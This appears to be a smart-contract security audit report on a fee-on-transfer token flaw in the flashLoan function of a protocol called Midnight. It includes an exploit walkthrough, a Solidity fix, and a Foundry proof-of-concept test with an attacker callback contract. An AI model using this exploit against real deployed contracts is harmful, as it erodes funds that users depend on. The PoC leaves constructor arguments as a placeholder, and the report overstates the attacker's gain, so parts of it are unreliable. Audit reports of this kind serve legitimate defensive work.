### Title
Fee-on-Transfer Token Drains Protocol Balance via flashLoan - (File: src/Midnight.sol)

### Summary
`flashLoan` sends `assets[i]` to the callback via `safeTransfer`, then unconditionally pulls `assets[i]` back via `safeTransferFrom` with no balance-before/after check. With a fee-on-transfer token, both legs of the transfer silently deliver less than `assets[i]`, so Midnight's net balance decreases by the fee amount on the repayment leg each time the function is called. No code-level guard prevents this.

### Finding Description
**Exact code path** — `src/Midnight.sol` lines 737–752:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // L743
}
// ... callback invoked ...
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // L750
}
```

`SafeTransferLib.safeTransfer` and `safeTransferFrom` (`src/libraries/SafeTransferLib.sol` lines 12–34) only verify that the call does not revert and that the boolean return value is `true`. They do not verify the amount actually credited to the recipient.

**Root cause** — there is no `balanceBefore` / `balanceAfter` check around either transfer leg. The function trusts that `safeTransferFrom(..., assets[i])` restores the exact pre-loan balance, which is false for fee-on-transfer tokens.

**Attacker inputs and exploit flow:**

1. Attacker deploys `AttackCallback` and pre-funds it with `fee` units of a fee-on-transfer token `T` (the fee amount needed to top up the repayment).
2. Attacker calls `midnight.flashLoan([T], [amount], attackCallback, data)`.
3. Midnight executes `safeTransfer(T, attackCallback, amount)` → `attackCallback` receives `amount − fee_out`.
4. `onFlashLoan` returns `CALLBACK_SUCCESS`; `attackCallback` approves `amount` to Midnight (it holds `amount − fee_out + fee_prefunded = amount` tokens).
5. Midnight executes `safeTransferFrom(T, attackCallback, address(this), amount)` → Midnight receives `amount − fee_in`.
6. `safeTransferFrom` returns `true` (the token call succeeded); no revert occurs.
7. Net: Midnight's balance of `T` is `B_before − fee_in`. The invariant `balance_after == balance_before` is broken.

**Why existing checks fail:**

- `SafeTransferLib` only checks call success and boolean return — not credited amount. [1](#0-0) 
- `flashLoan` has no `balanceBefore` snapshot and no post-repayment balance assertion. [2](#0-1) 
- The Certora solvency spec explicitly assumes away fee-on-transfer tokens (`"no fee taking from sender or receiver"`), so formal verification provides no coverage here. [3](#0-2) 
- `live_context.json` lists fee-on-transfer tokens as a concern that "should be tested if not explicitly excluded" — no code-level exclusion exists. [4](#0-3) 

### Impact Explanation
Every `flashLoan` call with a fee-on-transfer token reduces Midnight's token balance by the fee amount on the repayment leg. Because Midnight's balance must cover all withdrawable assets, collateral, and credit redemptions, repeated calls progressively under-collateralise the protocol, eventually making it unable to honour legitimate withdrawals or collateral releases for that token.

### Likelihood Explanation
**Preconditions:** (a) a fee-on-transfer token is held by Midnight (e.g. as a loan token in an active market); (b) the attacker pre-funds the callback with enough tokens to cover the outbound fee so that `safeTransferFrom` does not revert. Both conditions are attacker-controllable. The attack is permissionless, requires no special role, and is repeatable in a loop within a single transaction or across multiple transactions.

### Recommendation
Record the balance of each token before the outbound transfer and assert it is restored after the repayment:

```solidity
uint256[] memory balancesBefore = new uint256[](tokens.length);
for (uint256 i = 0; i < tokens.length; i++) {
    balancesBefore[i] = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
}
IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data);
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(IERC20(tokens[i]).balanceOf(address(this)) >= balancesBefore[i], InsufficientRepayment());
}
```

This mirrors the pattern used by Morpho Blue and Aave v3 flash loans.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// @dev ERC20 that takes a flat 1e15 fee on every transfer/transferFrom.
contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 constant FEE = 1e15;

    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt - FEE;          // fee burned / taken
        return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt - FEE;          // fee burned / taken
        return true;
    }
}

contract FeeFlashCallback is IFlashLoanCallback {
    FeeToken token;
    Midnight midnight;
    constructor(FeeToken t, Midnight m) { token = t; midnight = m; }

    function onFlashLoan(address, address[] memory tokens, uint256[] memory amounts, bytes memory)
        external returns (bytes32)
    {
        // Approve full repayment amount (callback was pre-funded with FEE tokens)
        token.approve(address(midnight), amounts[0]);
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    uint256 constant INITIAL_BALANCE = 10e18;
    uint256 constant LOAN_AMOUNT     = 1e18;
    uint256 constant FEE             = 1e15;

    Midnight midnight;
    FeeToken feeToken;
    FeeFlashCallback cb;

    function setUp() public {
        midnight = new Midnight(/* constructor args */);
        feeToken = new FeeToken();
        cb = new FeeFlashCallback(feeToken, midnight);

        // Seed Midnight with tokens
        feeToken.mint(address(midnight), INITIAL_BALANCE);
        // Pre-fund callback so repayment safeTransferFrom does not revert
        feeToken.mint(address(cb), FEE);
    }

    function test_feeOnTransferDrainsBalance() public {
        uint256 balBefore = feeToken.balanceOf(address(midnight));

        address[] memory tokens  = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0]  = address(feeToken);
        amounts[0] = LOAN_AMOUNT;

        midnight.flashLoan(tokens, amounts, address(cb), "");

        uint256 balAfter = feeToken.balanceOf(address(midnight));

        // Assert: Midnight's balance decreased by FEE — invariant violated
        assertEq(balAfter, balBefore - FEE, "protocol balance drained by fee");
    }
}
```

**Expected assertion:** `balAfter == balBefore − FEE` passes, proving the invariant `balance_after >= balance_before` is broken. Running this as a fuzz test with varying `LOAN_AMOUNT` and `FEE` values confirms the drain scales with the fee rate and is repeatable.
